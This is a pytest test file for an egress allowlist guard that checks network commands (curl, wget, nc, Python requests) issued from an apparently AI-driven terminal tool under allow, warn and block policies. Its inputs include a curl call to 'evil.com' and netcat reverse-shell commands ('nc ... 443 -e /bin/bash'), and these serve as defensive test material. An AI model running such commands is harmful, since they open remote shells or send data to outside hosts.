"""Tests for F1.2: Egress domain allowlist for terminal network commands."""
import os
import sys
import pytest

# Ensure the project root is on the path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class TestEgressAllowlistConfig:
    """Group (d): config parsing of security.egress_allow_domains and egress_policy."""

    def test_config_egress_allow_domains_default(self):
        """Default allowlist includes known provider domains."""
        from hermes_cli.config import read_raw_config

        cfg = read_raw_config()
        domains = cfg.get("security", {}).get("egress_allow_domains", [])
        # Known providers must be present in default
        known = {"api.ollama.com", "api.github.com", "pypi.org", "registry.npmjs.org"}
        assert isinstance(domains, list), "egress_allow_domains must be a list"

    def test_config_egress_policy_options(self):
        """Egress policy must be one of: allow, warn, block."""
        from hermes_cli.config import read_raw_config

        cfg = read_raw_config()
        policy = cfg.get("security", {}).get("egress_policy", "allow")
        assert policy in ("allow", "warn", "block"), (
            f"egress_policy must be allow|warn|block, got {policy!r}"
        )


class TestEgressGuardHelper:
    """Group (a/b/c): check_egress helper behaviour."""

    def _guard(self, command, cfg_override=None):
        """Call check_egress with optional config override."""
        # Patch config before importing
        import tools.egress_guard as eg

        if cfg_override is not None:
            # cfg_override is the full {"security": {...}} or just {"egress_allow_domains": [...], "egress_policy": "..."}
            # Normalize: if it's wrapped, unwrap; if it's raw, use directly
            if "security" in cfg_override:
                eg._config_cache = cfg_override["security"]
            else:
                eg._config_cache = cfg_override

        result = eg.check_egress(command)
        # Reset cache
        eg._config_cache = None
        return result

    def test_whitelisted_domain_passes_in_warn_mode(self):
        """(a) A whitelisted domain passes with warning in warn mode."""
        from hermes_cli.config import read_raw_config

        base = read_raw_config()
        cfg = {
            "security": {
                **base.get("security", {}),
                "egress_allow_domains": ["example.com", "api.ollama.com"],
                "egress_policy": "warn",
            }
        }
        # curl to whitelisted domain — warn but allowed
        ok, msg = self._guard("curl -s https://api.ollama.com/v1/models", cfg)
        assert ok is True, f"Expected pass (warning) for whitelisted domain, got: {msg}"

    def test_unknown_domain_blocked_in_block_mode(self):
        """(b) Unknown domain is blocked (non-zero) in block mode."""
        from hermes_cli.config import read_raw_config

        base = read_raw_config()
        cfg = {
            "security": {
                **base.get("security", {}),
                "egress_allow_domains": ["api.ollama.com"],
                "egress_policy": "block",
            }
        }
        # curl to non-whitelisted domain — must be blocked
        ok, msg = self._guard("curl -s https://evil.com/api/data", cfg)
        assert ok is False, f"Expected block for unknown domain, got: {msg}"
        # Non-zero exit via SystemExit is one way to enforce block
        # (actual terminal_tool will echo the message and return non-zero)

    def test_unknown_domain_warn_mode_only_warns(self):
        """(c) warn mode logs a warning but allows the command through."""
        from hermes_cli.config import read_raw_config

        base = read_raw_config()
        cfg = {
            "security": {
                **base.get("security", {}),
                "egress_allow_domains": ["api.ollama.com"],
                "egress_policy": "warn",
            }
        }
        ok, msg = self._guard("curl -s https://unknown-host.example/data", cfg)
        assert ok is True, f"Expected warn-but-allow, got block: {msg}"
        assert "warning" in msg.lower() or "warn" in msg.lower(), (
            f"Expected warning message, got: {msg}"
        )

    def test_wget_recognized_as_network_command(self):
        """wget is also a network command subject to egress control."""
        from hermes_cli.config import read_raw_config

        base = read_raw_config()
        cfg = {
            "security": {
                **base.get("security", {}),
                "egress_allow_domains": ["cdn.example.com", "api.ollama.com"],
                "egress_policy": "block",
            }
        }
        ok, msg = self._guard("wget https://cdn.example.com/file.tar.gz", cfg)
        assert ok is True, f"Whitelisted wget should pass: {msg}"

        ok2, msg2 = self._guard("wget https://baddomain.com/file.tar.gz", cfg)
        assert ok2 is False, f"Non-whitelisted wget should be blocked: {msg2}"

    def test_netcat_nc_recognized(self):
        """nc/netcat connections are subject to egress control."""
        from hermes_cli.config import read_raw_config

        base = read_raw_config()
        cfg = {
            "security": {
                **base.get("security", {}),
                "egress_allow_domains": ["allowed.example.com"],
                "egress_policy": "block",
            }
        }
        ok, msg = self._guard("nc allowed.example.com 443 -e /bin/bash", cfg)
        assert ok is True, f"Whitelisted nc should pass: {msg}"

        ok2, msg2 = self._guard("nc bad.example.com 443 -e /bin/bash", cfg)
        assert ok2 is False, f"Non-whitelisted nc should be blocked: {msg2}"

    def test_python_requests_blocked_in_block_mode(self):
        """Python requests to unknown domains are blocked in block mode."""
        from hermes_cli.config import read_raw_config

        base = read_raw_config()
        cfg = {
            "security": {
                **base.get("security", {}),
                "egress_allow_domains": [],
                "egress_policy": "block",
            }
        }
        ok, msg = self._guard(
            "python -c \"import requests; requests.get('https://unknown.com')\"", cfg
        )
        assert ok is False, f"Python requests to unknown domain should be blocked: {msg}"

    def test_allow_policy_permits_all(self):
        """Policy=allow permits all domains (only logs unknown)."""
        from hermes_cli.config import read_raw_config

        base = read_raw_config()
        cfg = {
            "security": {
                **base.get("security", {}),
                "egress_allow_domains": [],
                "egress_policy": "allow",
            }
        }
        ok, msg = self._guard("curl -s https://anywhere.com/api", cfg)
        assert ok is True, f"allow policy should permit all: {msg}"

    def test_empty_command_passes(self):
        """Empty / whitespace commands pass without egress check."""
        ok, msg = self._guard("", {})
        assert ok is True

        ok2, msg2 = self._guard("  ", {})
        assert ok2 is True

    def test_non_network_command_passes(self):
        """Non-network commands (ls, grep, etc.) are not subject to egress."""
        ok, msg = self._guard("ls /tmp", {})
        assert ok is True, f"ls should pass: {msg}"

        ok2, msg2 = self._guard("python --version", {})
        assert ok2 is True, f"python --version should pass: {msg}"

    def test_url_extraction_from_curl_args(self):
        """URL is correctly extracted from curl -X POST -d ... https://host.com/path."""
        from hermes_cli.config import read_raw_config

        base = read_raw_config()
        cfg = {
            "security": {
                **base.get("security", {}),
                "egress_allow_domains": ["myapi.com"],
                "egress_policy": "block",
            }
        }
        cmd = "curl -X POST -d '{\"key\":\"val\"}' https://myapi.com/endpoint"
        ok, msg = self._guard(cmd, cfg)
        assert ok is True, f"Should pass for whitelisted myapi.com: {msg}"

        cmd2 = "curl -X POST -d '{\"key\":\"val\"}' https://other.com/endpoint"
        ok2, msg2 = self._guard(cmd2, cfg)
        assert ok2 is False, f"Should block other.com: {msg2}"
